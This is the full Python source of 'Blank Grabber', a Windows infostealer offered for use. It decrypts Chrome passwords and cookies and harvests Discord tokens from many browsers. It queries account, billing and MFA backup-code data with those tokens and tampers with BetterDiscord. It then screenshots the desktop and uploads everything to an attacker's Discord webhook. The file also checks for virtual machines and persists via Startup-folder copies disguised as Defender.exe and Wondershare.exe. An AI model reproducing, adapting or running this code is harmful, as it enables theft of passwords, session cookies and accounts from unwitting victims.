global yourwebhook, pingme

##########################################

yourwebhook= "your webhook goes here" #Enter your webhook
pingme=True #ping you?

##########################################
import time, os, sys
if not os.name=="nt":
    print('Program can only be run on Microsoft Windows!')
    time.sleep(2)
    os._exit(1)
import requests
import shutil 
import sqlite3 
from zipfile import ZipFile
import json
import base64
import psutil 
import glob
import random
from PIL import ImageGrab

from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
from re import findall

class Blank_Grabber:
    def __init__(self):
        self.webhook = yourwebhook
        self.files = ""
        self.appdata = os.getenv("localappdata")
        self.roaming = os.getenv("appdata")
        self.tempfolder = os.getenv("temp")+"/"+"".join([(random.choice([chr(i) for i in range(97, 123)])) for i in range(14)])
        self.tempfolder2 = os.getenv("temp")+"/"+"".join([(random.choice([chr(i) for i in range(97, 123)])) for i in range(14)])
        try:
            os.mkdir(self.tempfolder2)
        except Exception:
            pass
        self.backupcodes={}
        self.passwords={}
        if os.path.isdir(self.tempfolder):
            shutil.rmtree(self.tempfolder)
        self.logfile = self.tempfolder+"/Logs.txt"
        if os.path.exists(self.tempfolder):
            try:
                shutil.rmtree(self.tempfolder)
            except Exception as e:
                pass
        global filedb, cookiedb
        filedb=f"{self.tempfolder2}/"+"".join([(random.choice([chr(i) for i in range(97, 123)])) for i in range(15)])+".db"
        cookiedb=f"{self.tempfolder2}/"+"".join([(random.choice([chr(i) for i in range(97, 123)])) for i in range(12)])+".db"
        try:
            os.mkdir(os.path.join(self.tempfolder))
        except Exception as e:
            with open(self.logfile, 'a') as log:
                log.write(f"Line {sys.exc_info()[2].tb_lineno} : {e.__class__.__name__} : {e}\n")
                os._exit(1)

        self.tokens = []
        self.saved = []
        if os.path.exists(os.getenv("appdata")+"/BetterDiscord"):
            self.bypass_better_discord()
        self.local_state_path=f"{self.appdata}/Google/Chrome/User Data/Local State"
        if os.path.isfile(self.local_state_path):
            self.grabPassword()
            self.grabCookies()
        self.grabTokens()
        self.screenshot()
        if os.path.isfile(self.logfile):
            with open(self.logfile, 'r+') as e:
                logs=e.read()
                e.seek(0)
                e.write("This file contains the errors happened, you can figure it out for yourself if you want or make an issue at https://github.com/Blank-c/Blank-Grabber\n\n"+logs)
        self.SendInfo()
        shutil.rmtree(self.tempfolder)
        shutil.rmtree(self.tempfolder2)
    
    def getheaders(self, token=None, content_type="application/json"):
        headers = {
            "Content-Type": content_type,
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
        }
        if token:
            headers.update({"Authorization": token})
        return headers
        
    def bypass_better_discord(self):
        bd = os.getenv("appdata")+"/BetterDiscord/data/betterdiscord.asar" #IDK if it work
        with open(bd, "rt") as f:
            content = f.read()
            content2 = content.replace("api/webhooks", "BlankBuffedMe")
        with open(bd, 'w'): pass
        with open(bd, "wt") as f:
            f.write(content2)
            
    def get_master_key(self):
        try:
            with open(self.local_state_path, "r") as f:
                local_state = f.read()
                local_state = json.loads(local_state)
            secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            secret_key = secret_key[5:] 
            secret_key = CryptUnprotectData(secret_key, None, None, None, 0)[1]
            return secret_key
        except Exception as e:
            with open(self.logfile, 'a') as log:
                log.write(f"Line {sys.exc_info()[2].tb_lineno} : {e.__class__.__name__} : {e}\n")
            return None
        
    def decrypt_payload(self, cipher, payload):
        return cipher.decrypt(payload)
    
    def generate_cipher(self, aes_key, iv):
        return AES.new(aes_key, AES.MODE_GCM, iv)
        
    def decrypt_password(self, ciphertext, secret_key):
        try:
            initialisation_vector = ciphertext[3:15]
            encrypted_password = ciphertext[15:-16]
            cipher = self.generate_cipher(secret_key, initialisation_vector)
            decrypted_pass = self.decrypt_payload(cipher, encrypted_password)
            decrypted_pass = decrypted_pass.decode()  
            return decrypted_pass
        except Exception as e:
            with open(self.logfile, 'a') as log:
                log.write(f"Line {sys.exc_info()[2].tb_lineno} : {e.__class__.__name__} : {e}\n")
            return "(Not Found)"
        
    def get_db_connection(self, chrome_path_login_db):
        try:
            shutil.copy(chrome_path_login_db, filedb) 
            return sqlite3.connect(filedb)
        except Exception as e:
            with open(self.logfile, 'a') as log:
                log.write(f"Line {sys.exc_info()[2].tb_lineno} : {e.__class__.__name__} : {e}\n")
    
    def grabPassword(self):
        try:
            secret_key = self.get_master_key()
            if secret_key is None:
                return
            tempvar=""
            checkvar=""
            checkvar=""
            for filename in glob.iglob(self.appdata+'/Google/Chrome/User Data/**/**', recursive=True):
                if os.path.isfile(filename):
                    if os.path.basename(filename).lower()=="login data":
                        if os.stat(filename).st_size == 0:
                            continue
                        try:
                            conn = self.get_db_connection(filename)
                            if(secret_key and conn):
                                cursor = conn.cursor()
                                cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                                for login in cursor.fetchall():
                                    url = login[0]
                                    username = login[1]
                                    ciphertext = login[2]
                                    if(url!="" and username!="" and ciphertext!=""):
                                        if url in checkvar:
                                            continue
                                        decrypted_password = self.decrypt_password(ciphertext, secret_key)
                                        tempvar+=f"*******************Blank Grabber*******************\n\nURL: {url}\nUsername: {username}\nPassword: {decrypted_password}\n\n"
                                        if "discord.com" in url and "@" in username:
                                            self.passwords[username] = decrypted_password
                                cursor.close()
                                conn.close()
                                try:
                                    os.remove(filedb)
                                except Exception as e:
                                    with open(self.logfile, 'a') as log:
                                        log.write(f"Line {sys.exc_info()[2].tb_lineno} : {e.__class__.__name__} : {e}\n")
                                if not tempvar=="":
                                    with open(self.tempfolder+"/Chrome Passwords.txt", mode='w', newline='') as e:
                                        e.write(tempvar)
                                        tempvar=""
                                        checkvar=tempvar
                        except Exception as e:
                            with open(self.logfile, 'a') as log:
                                log.write(f"Line {sys.exc_info()[2].tb_lineno} : {e.__class__.__name__} : {e}\n")
        except Exception as e:
            with open(self.logfile, 'a') as log:
                log.write(f"Line {sys.exc_info()[2].tb_lineno} : {e.__class__.__name__} : {e}\n")
    
    def grabCookies(self):
        try:
            secret_key = self.get_master_key()
            if secret_key is None:
                return
            tempvar=""
            checkvar=""
            for filename in glob.iglob(self.appdata+'/Google/Chrome/User Data/**/**', recursive=True):
                if os.path.isfile(filename):
                    if os.path.basename(filename).lower()=="cookies":
                        if os.stat(filename).st_size == 0:
                            continue
                        shutil.copy(filename, cookiedb)
                        try:
                            conn = sqlite3.connect(cookiedb)
                            conn.text_factory = bytes
                            cursor = conn.cursor()
                            cursor.execute("SELECT host_key, name, encrypted_value from cookies")
                            for r in cursor.fetchall():
                                Host = r[0]
                                user = r[1]
                                encrypted_cookie = r[2]
                                try:
                                    encrypted_cookie = r[2].decode('utf-8')
                                except UnicodeDecodeError:
                                    continue
                                decrypted_cookie = self.decrypt_password(encrypted_cookie, secret_key)
                                if Host != "":
                                    if not Host in checkvar:
                                        tempvar+=f"*******************Blank Grabber*******************\n\nHost: {Host}\nName: {user}\nCookie: {decrypted_cookie}\n\n"
                            cursor.close()
                            conn.close()
                            try:
                                os.remove(cookiedb)
                            except Exception as e:
                                with open(self.logfile, 'a') as log:
                                    log.write(f"Line {sys.exc_info()[2].tb_lineno} : {e.__class__.__name__} : {e}\n")
                            if not tempvar=="":
                                with open(self.tempfolder+"/Chrome Cookies.txt", "w", errors='ignore') as e:
                                    e.write(tempvar)
                        except Exception as e:
                            with open(self.logfile, 'a') as log:
                                #log.write(f"Line {sys.exc_info()[2].tb_lineno} : {e.__class__.__name__} : {e}\n")
                                print(f"Line {sys.exc_info()[2].tb_lineno} : {e.__class__.__name__} : {e}\n")
        except Exception as e:
            with open(self.logfile, 'a') as log:
                log.write(f"Line {sys.exc_info()[2].tb_lineno} : {e.__class__.__name__} : {e}\n")
    def grabTokens(self):
        token=""
        paths = {
            'Discord': self.roaming + r'/discord/Local Storage/leveldb/',
            'Discord Canary': self.roaming + r'/discordcanary/Local Storage/leveldb/',
            'Lightcord': self.roaming + r'/Lightcord/Local Storage/leveldb/',
            'Discord PTB': self.roaming + r'/discordptb/Local Storage/leveldb/',
            'Opera': self.roaming + r'/Opera Software/Opera Stable/Local Storage/leveldb/',
            'Opera GX': self.roaming + r'/Opera Software/Opera GX Stable/Local Storage/leveldb/',
            'Amigo': self.appdata + r'/Amigo/User Data/Local Storage/leveldb/',
            'Torch': self.appdata + r'/Torch/User Data/Local Storage/leveldb/',
            'Kometa': self.appdata + r'/Kometa/User Data/Local Storage/leveldb/',
            'Orbitum': self.appdata + r'/Orbitum/User Data/Local Storage/leveldb/',
            'CentBrowser': self.appdata + r'/CentBrowser/User Data/Local Storage/leveldb/',
            '7Star': self.appdata + r'/7Star/7Star/User Data/Local Storage/leveldb/',
            'Sputnik': self.appdata + r'/Sputnik/Sputnik/User Data/Local Storage/leveldb/',
            'Vivaldi': self.appdata + r'/Vivaldi/User Data/Default/Local Storage/leveldb/',
            'Chrome SxS': self.appdata + r'/Google/Chrome SxS/User Data/Local Storage/leveldb/',
            'Chrome': """I will take care of it myself""",
            'Epic Privacy Browser': self.appdata + r'/Epic Privacy Browser/User Data/Local Storage/leveldb/',
            'Microsoft Edge': self.appdata + r'/Microsoft/Edge/User Data/Defaul/Local Storage/leveldb/',
            'Uran': self.appdata + r'/uCozMedia/Uran/User Data/Default/Local Storage/leveldb/',
            'Yandex': self.appdata + r'/Yandex/YandexBrowser/User Data/Default/Local Storage/leveldb/',
            'Brave': self.appdata + r'/BraveSoftware/Brave-Browser/User Data/Default/Local Storage/leveldb/',
            'Iridium': self.appdata + r'/Iridium/User Data/Default/Local Storage/leveldb/'
        }
        users=[]
        
        def grabcord(path):
            for file_name in os.listdir(path):
                if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                    continue
                for line in [x.strip() for x in open(f'{path}/{file_name}', errors='ignore').readlines() if x.strip()]:
                    for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                        for token in findall(regex, line):
                            if not token in self.tokens:
                                self.tokens.append(token)

        for source, path in paths.items():
            if not source=='Chrome':
                if not os.path.exists(path):
                    continue
                else:
                    grabcord(path)
            else:
                path=self.appdata+r'\Google\Chrome\User Data'
                if not os.path.exists(path):
                    continue
                for p in os.listdir(path):
                    if os.path.isdir(os.path.join(path, p)):
                        p=os.path.join(path, p)
                        for i in os.listdir(p):
                            i=os.path.join(p, i)
                            if os.path.isdir(i) and os.path.basename(i).lower()=='local storage':
                                grabcord(i+'/leveldb')
        
        for token in self.tokens:
            r = requests.get("https://discord.com/api/v9/users/@me", headers=self.getheaders(token))
            if r.status_code == 200:
                if token in self.saved:
                    continue
                self.saved.append(token)
                j = requests.get("https://discord.com/api/v9/users/@me", headers=self.getheaders(token)).json()
                user = j["username"] + "#" + str(j["discriminator"])
                email = j["email"].strip()
                phone = j["phone"] if j["phone"] else "No Phone Number attached"
                verified=j["verified"]

                nitro_data = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=self.getheaders(token)).json()
                has_nitro = False
                has_nitro = bool(len(nitro_data) > 0)

                billing = bool(len(json.loads(requests.get("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers=self.getheaders(token)).text)) > 0)
                if token=="":
                    continue
                if email in self.passwords.keys():
                    password=f"\nPassword: {self.passwords[email]}"
                    if token.startswith("mfa."):
                        r=requests.post("https://discord.com/api/v9/users/@me/mfa/codes", headers=self.getheaders(token), json={"password": self.passwords[email], "regenerate": False}).json()
                        if not r['backup_codes'] is None:
                            self.backupcodes[user]=[i for i in r['backup_codes']]
                            with open(self.tempfolder+"//Backup Codes.txt", 'a') as e:
                                e.write(f"*******************Blank Grabber*******************\n\nUsername: {user}\nBackup Codes: {str(self.backupcodes['user']).replace('[', '').replace(']', '')}\n\n")
                else:
                    password=""
                with open(self.tempfolder+"/Discord Info.txt", "a", errors='ignore') as f:
                    f.write(f"*******************Blank Grabber*******************\n\nUsername: {user}\nToken: {token}\n2FA: {'Yes' if token.startswith('mfa.') else 'No'}{password}\nHas Billing: {billing}\nNitro: {has_nitro}\nEmail: {email}\nPhone: {phone}\nVerified: {verified}\n\n")

    def screenshot(self):
        image = ImageGrab.grab()
        image.save(self.tempfolder + "/Screenshot.png")

    def SendInfo(self):
        ip = None
        try:
            ip = requests.get("https://api.ipify.org/").text
        except Exception as e:
            with open(self.logfile, 'a') as log:
                log.write(f"Line {sys.exc_info()[2].tb_lineno} : {e.__class__.__name__} : {e}\n")
        n=0
        for file in os.listdir(self.tempfolder):
            if os.path.isfile(os.path.abspath(os.path.join(self.tempfolder, file))):
                if os.stat(os.path.abspath(os.path.join(self.tempfolder, file))).st_size == 0:
                    continue
                n+=1
                self.files += f"\n{file}"
        if n==0 or n==1:
            os._exit(1)
        destination_of_zip_file = os.path.join(self.appdata, f'Blank-[{os.getlogin()}].zip')
        self.zip(self.tempfolder, destination_of_zip_file)
        fileCount = f"{n} Files Found: "
        embed = {
            "content": "@everyone" if pingme else "",
            "embeds": [
                {
                    "title":"Blank Grabber",
                    "description": f"```fix\nComputer Name: {os.getenv('COMPUTERNAME')}\nIP: {ip}\nTotal Memory: {int((psutil.virtual_memory().total)/1073741824)+1}GB ({psutil.virtual_memory().percent}% used)```\n**{fileCount}**```fix\n{self.files}```",
                    "color": 16737536
                }
            ]
        }
        try:
            if not self.webhook=="your webhook goes here":
                requests.post(self.webhook, json=embed)
                requests.post(self.webhook, files={"upload_file": open(destination_of_zip_file,'rb')})
        except Exception as e:
            with open(self.logfile, 'a') as log:
                log.write(f"Line {sys.exc_info()[2].tb_lineno} : {e.__class__.__name__} : {e}\n")
        try:
            os.remove(destination_of_zip_file)
        except Exception:
            pass

    def zip(self, src, dst):
        with ZipFile(dst, "w") as zfile:
            for file in os.listdir(src):
                file=os.path.abspath(os.path.join(src, file))
                if os.path.isfile(file):
                    if os.stat(file).st_size==0:
                        continue
                    zfile.write(file, os.path.basename(file))
        
if __name__=="__main__":
    if hasattr(sys, 'real_prefix'): #VM detection stage 1
        print('Have a nice day1')
        os._exit(1)
    try:
        r=requests.get("https://BlankGrabb.er/"+"".join([(random.choice([chr(i) for i in range(97, 123)])) for i in range(5)]))
        print('Have a nice day')
        os._exit(1) #VM detection stage 2
    except requests.ConnectionError: pass
    
    if getattr(sys, 'frozen', False):
        frozen = True #File is exe
    else:
        frozen = False #File is not an exe
    
    if frozen:
        try:
            shutil.copy(sys.executable, os.environ['USERPROFILE']+"/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/Defender.exe")
        except Exception:
            try:
                os.mkdir(os.environ['USERPROFILE']+"/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/")
                shutil.copy(sys.executable, os.environ['USERPROFILE']+"/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/Defender.exe")
            except Exception: pass
    
        try:
            shutil.copy(sys.executable, "C:/ProgramData/Microsoft/Windows/Start Menu/Programs/Startup/Wondershare.exe")
        except Exception:
            try:
                os.mkdir("C:/ProgramData/Microsoft/Windows/Start Menu/Programs/Startup/")
                shutil.copy(sys.executable, "C:/ProgramData/Microsoft/Windows/Start Menu/Programs/Startup/Wondershare.exe")
            except Exception: pass
    while True:
        while True:
            try:
                requests.get("https://www.google.com") #Checking internet connection
                break
            except Exception:
                pass
        Blank_Grabber()
        time.sleep(1800) #30 minutes
